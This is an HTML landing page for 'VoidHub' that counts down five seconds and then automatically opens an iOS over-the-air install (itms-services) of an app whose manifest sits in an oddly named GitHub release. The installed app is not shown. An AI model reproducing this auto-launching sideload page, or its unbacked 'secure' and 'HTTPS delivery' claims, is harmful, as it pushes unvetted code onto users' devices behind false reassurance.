<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#05070b">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <title>VoidHub — Install</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    :root {
      --bg: #05070b;
      --panel: rgba(13, 17, 25, .82);
      --panel-2: #0b0f17;
      --text: #f5f8fc;
      --muted: #8994a7;
      --cyan: #4be8ff;
      --green: #68f5a5;
      --line: rgba(255,255,255,.09);
    }
    html,
    body {
      width: 100%;
      min-height: 100%;
    }
    body {
      min-height: 100svh;
      display: grid;
      place-items: center;
      overflow: hidden;
      padding: 18px;
      color: var(--text);
      font-family:
        -apple-system,
        BlinkMacSystemFont,
        "SF Pro Display",
        "Segoe UI",
        sans-serif;
      background:
        radial-gradient(
          circle at 50% 10%,
          rgba(75,232,255,.16),
          transparent 32%
        ),
        radial-gradient(
          circle at 50% 100%,
          rgba(104,245,165,.05),
          transparent 35%
        ),
        var(--bg);
    }
    .background-grid {
      position: fixed;
      inset: 0;
      pointer-events: none;
      opacity: .035;
      background-image:
        linear-gradient(rgba(255,255,255,.55) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,.55) 1px, transparent 1px);
      background-size: 34px 34px;
    }
    .glow {
      position: fixed;
      width: 320px;
      height: 320px;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      border-radius: 50%;
      background: rgba(75,232,255,.06);
      filter: blur(80px);
      pointer-events: none;
    }
    .box {
      position: relative;
      width: min(430px, 100%);
      padding: 30px 24px 24px;
      text-align: center;
      border: 1px solid var(--line);
      border-radius: 28px;
      background: var(--panel);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      box-shadow:
        0 25px 80px rgba(0,0,0,.42),
        inset 0 1px 0 rgba(255,255,255,.04);
    }
    .logo {
      display: inline-flex;
      align-items: center;
      gap: 3px;
      margin-bottom: 28px;
      font-size: 15px;
      font-weight: 950;
      letter-spacing: 3.5px;
    }
    .logo span {
      color: var(--cyan);
    }
    .subtitle {
      margin-top: -18px;
      margin-bottom: 28px;
      color: #687386;
      font-size: 9px;
      font-weight: 700;
      letter-spacing: 1.5px;
      text-transform: uppercase;
    }
    .ring {
      position: relative;
      width: 176px;
      height: 176px;
      margin: auto;
      display: grid;
      place-items: center;
      border-radius: 50%;
      background:
        conic-gradient(
          var(--cyan) var(--progress),
          rgba(255,255,255,.065) var(--progress)
        );
      box-shadow:
        0 0 35px rgba(75,232,255,.10);
    }
    .ring::before {
      content: "";
      position: absolute;
      inset: -2px;
      border-radius: 50%;
      background: conic-gradient(
        transparent 0deg,
        rgba(75,232,255,.25) var(--progress),
        transparent var(--progress)
      );
      filter: blur(8px);
      opacity: .7;
      pointer-events: none;
    }
    .ring-inner {
      position: relative;
      width: 156px;
      height: 156px;
      display: grid;
      place-items: center;
      border-radius: 50%;
      background:
        radial-gradient(
          circle at 50% 35%,
          #111925,
          var(--panel-2) 68%
        );
      border: 1px solid rgba(255,255,255,.05);
    }
    .count {
      font-size: 50px;
      font-weight: 900;
      line-height: 1;
      font-variant-numeric: tabular-nums;
      letter-spacing: -2px;
    }
    .count-label {
      margin-top: 7px;
      color: var(--muted);
      font-size: 8px;
      font-weight: 800;
      letter-spacing: 2px;
    }
    h1 {
      margin-top: 28px;
      font-size: 23px;
      font-weight: 850;
      letter-spacing: -.5px;
    }
    .description {
      min-height: 42px;
      margin: 10px auto 0;
      max-width: 310px;
      color: var(--muted);
      font-size: 12px;
      line-height: 1.7;
    }
    .status {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 9px;
      margin-top: 19px;
      color: var(--green);
      font-size: 9px;
      font-weight: 850;
      letter-spacing: 1.3px;
    }
    .dot {
      width: 7px;
      height: 7px;
      flex: 0 0 7px;
      border-radius: 50%;
      background: var(--green);
      box-shadow: 0 0 12px var(--green);
      animation: pulse 1.7s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% {
        opacity: .55;
        transform: scale(.85);
      }
      50% {
        opacity: 1;
        transform: scale(1.15);
      }
    }
    .install {
      width: 100%;
      min-height: 54px;
      margin-top: 25px;
      border: 0;
      border-radius: 15px;
      background: var(--cyan);
      color: #031014;
      font-size: 13px;
      font-weight: 900;
      letter-spacing: .3px;
      cursor: pointer;
      opacity: .35;
      pointer-events: none;
      transform: translateY(0);
      transition:
        opacity .3s ease,
        transform .2s ease,
        box-shadow .3s ease;
      box-shadow: 0 0 0 rgba(75,232,255,0);
    }
    .install.ready {
      opacity: 1;
      pointer-events: auto;
      box-shadow:
        0 10px 35px rgba(75,232,255,.16);
    }
    .install.ready:active {
      transform: scale(.975);
    }
    .install:hover {
      box-shadow:
        0 10px 40px rgba(75,232,255,.22);
    }
    .small {
      margin-top: 13px;
      color: #596273;
      font-size: 9px;
      line-height: 1.55;
    }
    .secure {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
      margin-top: 18px;
      color: #596273;
      font-size: 8px;
      font-weight: 700;
      letter-spacing: .8px;
      text-transform: uppercase;
    }
    .secure-icon {
      font-size: 9px;
    }
    @media (max-height: 700px) {
      .box {
        padding-top: 22px;
        padding-bottom: 18px;
      }
      .logo {
        margin-bottom: 18px;
      }
      .subtitle {
        margin-bottom: 18px;
      }
      .ring {
        width: 145px;
        height: 145px;
      }
      .ring-inner {
        width: 127px;
        height: 127px;
      }
      .count {
        font-size: 42px;
      }
      h1 {
        margin-top: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="background-grid"></div>
  <div class="glow"></div>
  <main class="box">
    <div class="logo">VOID<span>HUB</span></div>
    <div class="subtitle">Secure installation portal</div>
    <div
      class="ring"
      id="ring"
      style="--progress: 0deg;"
    >
      <div class="ring-inner">
        <div>
          <div class="count" id="count">5.0</div>
          <div class="count-label">SECONDS</div>
        </div>
      </div>
    </div>
    <h1 id="title">Preparing installation</h1>
    <p class="description" id="description">
      Your installation request is being prepared.
    </p>
    <div class="status">
      <span class="dot"></span>
      <span id="statusText">SYSTEM READY</span>
    </div>
    <button
      class="install"
      id="installButton"
      type="button"
    >
      INSTALL NOW
    </button>
    <p class="small">
      When preparation is complete, the iOS installer will open automatically.
    </p>
    <div class="secure">
      <span class="secure-icon">◆</span>
      <span>HTTPS DELIVERY</span>
    </div>
  </main>
  <script>
    const manifestURL =
      "https://github.com/GZZGSOLAE/Hgfghj/releases/download/B/manifest.plist";
    const installURL =
      "itms-services://?action=download-manifest&url=" +
      encodeURIComponent(manifestURL);
    const countElement =
      document.getElementById("count");
    const ring =
      document.getElementById("ring");
    const title =
      document.getElementById("title");
    const description =
      document.getElementById("description");
    const statusText =
      document.getElementById("statusText");
    const installButton =
      document.getElementById("installButton");
    const duration = 5000;
    const startTime = performance.now();
    let launched = false;
    let finished = false;
    function launchInstall() {
      if (launched) return;
      launched = true;
      title.textContent = "Opening installer";
      description.textContent =
        "Launching the iOS installation request.";
      statusText.textContent =
        "INSTALL REQUEST SENT";
      window.location.href = installURL;
    }
    function animate(timestamp) {
      if (finished) return;
      const elapsed =
        timestamp - startTime;
      const progress =
        Math.min(elapsed / duration, 1);
      const remaining =
        Math.max(0, duration - elapsed);
      const seconds =
        remaining / 1000;
      const degrees =
        progress * 360;
      ring.style.setProperty(
        "--progress",
        degrees + "deg"
      );
      if (progress < 1) {
        countElement.textContent =
          seconds.toFixed(1);
        requestAnimationFrame(animate);
        return;
      }
      finished = true;
      countElement.textContent = "✓";
      title.textContent =
        "Ready to install";
      description.textContent =
        "Opening the iOS installer now.";
      statusText.textContent =
        "INSTALLER READY";
      installButton.classList.add("ready");
      setTimeout(launchInstall, 500);
    }
    installButton.addEventListener(
      "click",
      launchInstall
    );
    requestAnimationFrame(animate);
  </script>
</body>
</html>
